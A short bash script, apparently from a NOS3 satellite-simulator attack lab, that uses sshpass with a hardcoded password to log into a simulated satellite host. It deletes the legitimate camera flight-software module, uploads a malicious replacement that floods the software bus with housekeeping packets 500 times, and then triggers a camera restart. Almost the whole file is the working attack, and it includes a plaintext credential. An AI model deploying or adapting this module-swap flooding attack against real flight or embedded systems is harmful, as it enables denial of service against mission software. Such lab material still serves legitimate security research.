#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

# arducam_flood_hk_fix.so has been compiled on SAT1
# aim : flood the software bus using the legitimate camera HK packet 500 times, as a side-effect can overload TO
# command to trigger : CAM_EXP3_CC

/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "rm /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"
/usr/bin/sshpass -p nos3123! scp arducam_flood_hk_fix.so nos3@$IPSAT1:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_flood_hk_fix.so    # for more realistic attack use CFDP TC (not working with NOS3 v1.6.2)
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "mv /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_flood_hk_fix.so /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"

#restart the camera for the new .so to take effect
python3 Attack_A13.py

## NB: don't forget to reset nominal version of .so after the attack !


    
    





